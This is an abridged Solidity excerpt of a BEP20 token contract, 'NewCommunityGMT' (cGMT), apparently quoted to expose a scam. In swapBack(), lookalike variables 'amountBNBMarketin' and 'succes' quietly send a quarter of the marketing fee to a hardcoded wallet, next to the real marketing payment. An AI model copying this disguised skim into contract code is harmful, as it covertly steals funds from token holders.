...
contract NEWCOMMUNITYGMT is IBEP20, Auth {
   using SafeMath for uint256;
   ...
   string constant _name = "NewCommunityGMT";
   string constant _symbol = "cGMT";
...
_balances[recipient] = _balances[recipient].add(amountReceived);
   ...
   function swapBack() internal swapping {
       ...
       uint256 amountBNBMarketin = amountBNB.mul(marketingFee).div(totalBNBFee).mul(1).div(4);
 
       try distributor.deposit{value: amountBNBReflection}() {} catch {}
       (bool success, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
       (bool succes, /* bytes memory data */) = payable(0x330443c01DF00A1e81913B2d5F1c249b039aeD9a).call{value: amountBNBMarketin, gas: 30000}("");
